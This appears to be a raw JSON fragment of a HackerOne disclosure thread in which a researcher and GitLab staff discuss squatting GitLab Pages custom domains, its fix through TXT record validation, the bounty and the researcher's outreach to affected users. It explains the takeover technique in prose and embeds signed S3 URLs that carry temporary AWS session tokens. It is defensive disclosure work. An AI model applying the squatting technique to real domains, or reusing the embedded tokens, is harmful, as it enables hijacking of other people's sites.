href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-07T19:26:01.992Z","updated_at":"2018-02-07T19:26:01.992Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2360201,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@edoverflow a question for you on your suggested mitigation approach... once the TXT record key is placed, will that address this issue that you are highlighting? Or would a re-verification mechanism also be needed?","markdown_message":"\u003cp\u003e\u003ca href=\"/edoverflow\"\u003e@edoverflow\u003c/a\u003e a question for you on your suggested mitigation approach... once the TXT record key is placed, will that address this issue that you are highlighting? Or would a re-verification mechanism also be needed?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-07T19:53:14.255Z","updated_at":"2018-02-07T19:53:14.255Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2360315,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @kathyw,\n\nTXT record validation when adding the custom domain should mitigate this issue. You generate the token when the user adds the domain.\n\n{F261178}","markdown_message":"\u003cp\u003eHi \u003ca href=\"/kathyw\"\u003e@kathyw\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eTXT record validation when adding the custom domain should mitigate this issue. You generate the token when the user adds the domain.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"gitlab-proposed-fix.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/261/178/0e163d0559e478d9d73096e125269ef65bce4167/gitlab-proposed-fix.png?response-content-disposition=attachment%3B%20filename%3D%22gitlab-proposed-fix.png%22%3B%20filename%2A%3DUTF-8%27%27gitlab-proposed-fix.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053227Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=0c331f59dc517165136ff2beb61099ad4a99b25ac7c3309a1c8f8f985f895761\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/261/178/0e163d0559e478d9d73096e125269ef65bce4167/gitlab-proposed-fix.png?response-content-disposition=attachment%3B%20filename%3D%22gitlab-proposed-fix.png%22%3B%20filename%2A%3DUTF-8%27%27gitlab-proposed-fix.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053227Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=0c331f59dc517165136ff2beb61099ad4a99b25ac7c3309a1c8f8f985f895761\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-07T20:34:54.604Z","updated_at":"2018-02-07T20:34:54.604Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":261178,"filename":"gitlab-proposed-fix.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/261/178/0e163d0559e478d9d73096e125269ef65bce4167/gitlab-proposed-fix.png?response-content-disposition=attachment%3B%20filename%3D%22gitlab-proposed-fix.png%22%3B%20filename%2A%3DUTF-8%27%27gitlab-proposed-fix.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053227Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=0c331f59dc517165136ff2beb61099ad4a99b25ac7c3309a1c8f8f985f895761"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2360597,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edoverflow ,\n\nI have a couple of questions and below is my understanding of the report.\n\n## Vulnerability vs exploit\n\nIsn't the real vulnerability that **GitLab doesn't validate the custom domain** when added?\n\nhttps://hackerone.com/reports/296907 exploits this vulnerability by claiming the domain when stale DNS A records **already** point to `52.167.214.135`. My understanding is that this report exploits this vulnerability by claiming the domain name **before** the DNS record has been added. To me, this report seems to be a different exploit of the same vulnerability.\n\nAlso, if the real issue is a lack of custom domain validation, why would allowing multiple domains be a vulnerability as long as are validated?\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edoverflow\"\u003e@edoverflow\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI have a couple of questions and below is my understanding of the report.\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability-vs-exploit\"\u003eVulnerability vs exploit\u003c/h2\u003e\n\n\u003cp\u003eIsn\u0026#39;t the real vulnerability that \u003cstrong\u003eGitLab doesn\u0026#39;t validate the custom domain\u003c/strong\u003e when added?\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://hackerone.com/reports/296907\" href=\"https://hackerone.com/reports/296907\"\u003ehttps://hackerone.com/reports/296907\u003c/a\u003e exploits this vulnerability by claiming the domain when stale DNS A records \u003cstrong\u003ealready\u003c/strong\u003e point to \u003ccode\u003e52.167.214.135\u003c/code\u003e. My understanding is that this report exploits this vulnerability by claiming the domain name \u003cstrong\u003ebefore\u003c/strong\u003e the DNS record has been added. To me, this report seems to be a different exploit of the same vulnerability.\u003c/p\u003e\n\n\u003cp\u003eAlso, if the real issue is a lack of custom domain validation, why would allowing multiple domains be a vulnerability as long as are validated?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-07T22:38:48.208Z","updated_at":"2018-02-07T22:38:48.208Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2362081,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Isn't the real vulnerability that GitLab doesn't validate the custom domain when added?\n\nThat and the fact that you allow an unrestricted number of domains for a single repository, and that you allow users to add domains that are not pointing towards `52.167.214.135`.\n\n\u003e To me, this report seems to be a different exploit of the same vulnerability.\n\nLet me break down the two reports and explain what is going on.\n\n**#296907** \n\nThis report is what we commonly refer to as a \"(sub)domain takeover\". This issue is quite prevalent, but normally you do not report the issue to the service the vendor is serving their content on, but rather the vendor themselves. See https://hackerone.com/reports/263902 where I reported 5 subdomain takeovers to the TTS where their subdomains were pointing to GitHub.\n\nThis type of issue is caused by the user and not the vendor, therefore I fully agree with Brian's conclusion. What surprised me about that report is the fact that you disclosed it without notifying affected users. In fact, I recreated the exploit and added a small trick where I check the apex domain and the `www.` subdomain to increase the pool of vulnerable users to 700.\n\n**#312118 (this report)**\n\nThis report is about squatting domains **before** they even point to GitLab, preventing the user from using their custom domain, and serving content on their domain. This issue is in fact caused by GitLab and **not** the user.\n\n1. You should not allow registering an unlimited number of (sub)domains for a single repository;\n2. You should not allow users to add domains that are not already pointing to `52.167.214.135`;\n3. You should validate the domain when a user adds the domain to their repository.\n\nAdmittedly, you might kill two birds with one stone when using my proposed fix, but that does not mean it is the same issue at all. My finding is more in-depth and therefore requires fixing #296907 in the process too.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eIsn\u0026#39;t the real vulnerability that GitLab doesn\u0026#39;t validate the custom domain when added?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThat and the fact that you allow an unrestricted number of domains for a single repository, and that you allow users to add domains that are not pointing towards \u003ccode\u003e52.167.214.135\u003c/code\u003e.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eTo me, this report seems to be a different exploit of the same vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eLet me break down the two reports and explain what is going on.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e#296907\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eThis report is what we commonly refer to as a \u0026quot;(sub)domain takeover\u0026quot;. This issue is quite prevalent, but normally you do not report the issue to the service the vendor is serving their content on, but rather the vendor themselves. See \u003ca title=\"https://hackerone.com/reports/263902\" href=\"https://hackerone.com/reports/263902\"\u003ehttps://hackerone.com/reports/263902\u003c/a\u003e where I reported 5 subdomain takeovers to the TTS where their subdomains were pointing to GitHub.\u003c/p\u003e\n\n\u003cp\u003eThis type of issue is caused by the user and not the vendor, therefore I fully agree with Brian\u0026#39;s conclusion. What surprised me about that report is the fact that you disclosed it without notifying affected users. In fact, I recreated the exploit and added a small trick where I check the apex domain and the \u003ccode\u003ewww.\u003c/code\u003e subdomain to increase the pool of vulnerable users to 700.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e#312118 (this report)\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThis report is about squatting domains \u003cstrong\u003ebefore\u003c/strong\u003e they even point to GitLab, preventing the user from using their custom domain, and serving content on their domain. This issue is in fact caused by GitLab and \u003cstrong\u003enot\u003c/strong\u003e the user.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eYou should not allow registering an unlimited number of (sub)domains for a single repository;\u003c/li\u003e\n\u003cli\u003eYou should not allow users to add domains that are not already pointing to \u003ccode\u003e52.167.214.135\u003c/code\u003e;\u003c/li\u003e\n\u003cli\u003eYou should validate the domain when a user adds the domain to their repository.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAdmittedly, you might kill two birds with one stone when using my proposed fix, but that does not mean it is the same issue at all. My finding is more in-depth and therefore requires fixing \u003ca href=\"/reports/296907\"\u003e#296907\u003c/a\u003e in the process too.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-08T10:05:01.447Z","updated_at":"2018-02-08T10:05:01.447Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2363416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edoverflow,\n\nThanks the detailed clarification. I'm awarding a High severity bounty for this report. Also, I'm referencing the notification on the GitLab blog https://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/.\n\nBest,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/edoverflow\"\u003e@edoverflow\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks the detailed clarification. I\u0026#39;m awarding a High severity bounty for this report. Also, I\u0026#39;m referencing the notification on the GitLab blog \u003ca title=\"https://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/\" href=\"/redirect?url=https%3A%2F%2Fabout.gitlab.com%2F2018%2F02%2F05%2Fgitlab-pages-custom-domain-validation%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-08T17:49:39.520Z","updated_at":"2018-02-08T17:49:39.520Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363419,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-08T17:50:21.845Z","updated_at":"2018-02-08T17:50:21.845Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":116723},"actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363420,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-08T17:50:29.480Z","updated_at":"2018-02-08T17:50:29.480Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"edoverflow","url":"/edoverflow"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363425,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-08T17:51:32.993Z","updated_at":"2018-02-08T17:51:32.993Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363426,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-08T17:51:46.678Z","updated_at":"2018-02-08T17:51:46.678Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363430,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you, @jritchey. I am very impressed by your program and I look forward to reporting more issues in the future.","markdown_message":"\u003cp\u003eThank you, \u003ca href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e. I am very impressed by your program and I look forward to reporting more issues in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-08T17:56:26.486Z","updated_at":"2018-02-08T17:56:26.486Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2363439,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-08T18:01:36.293Z","updated_at":"2018-02-08T18:01:36.293Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363441,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-08T18:02:07.306Z","updated_at":"2018-02-08T18:02:07.306Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2363608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To help you with keeping track of affected users, I constructed a list of potentially vulnerable (sub)domains.\n\n```\n$ wc -l vulnerable-gitlab-projects.txt\n1350 vulnerable-gitlab-projects.txt\n```","markdown_message":"\u003cp\u003eTo help you with keeping track of affected users, I constructed a list of potentially vulnerable (sub)domains.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ wc -l vulnerable-gitlab-projects.txt\n1350 vulnerable-gitlab-projects.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-02-08T19:03:48.128Z","updated_at":"2018-02-08T19:03:48.128Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2364303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @edoverflow !","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/edoverflow\"\u003e@edoverflow\u003c/a\u003e !\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-08T23:13:58.627Z","updated_at":"2018-02-08T23:13:58.627Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2376739,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I would like to apologise for contacting affected users without notifying you first. I was hoping to help your customers and in the process help you in resolving this issue. I am terribly sorry, it didn't even cross my mind that affected users could possibly panic and contact support. I promise not to contact any further affected users and instead to submit them here for you to contact.","markdown_message":"\u003cp\u003eI would like to apologise for contacting affected users without notifying you first. I was hoping to help your customers and in the process help you in resolving this issue. I am terribly sorry, it didn\u0026#39;t even cross my mind that affected users could possibly panic and contact support. I promise not to contact any further affected users and instead to submit them here for you to contact.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-12T21:10:32.023Z","updated_at":"2018-02-12T21:10:32.023Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2376997,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We understand you have good intentions. If you’re unsure about any actions, please check with us first.","markdown_message":"\u003cp\u003eWe understand you have good intentions. If you’re unsure about any actions, please check with us first.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-12T23:03:08.887Z","updated_at":"2018-02-12T23:03:08.887Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2413440,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-21T21:39:15.105Z","updated_at":"2018-02-21T21:39:15.105Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2413705,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-21T23:46:09.412Z","updated_at":"2018-02-21T23:46:09.412Z","first_to_agree":true,"actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2413707,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-21T23:46:26.856Z","updated_at":"2018-02-21T23:46:26.856Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf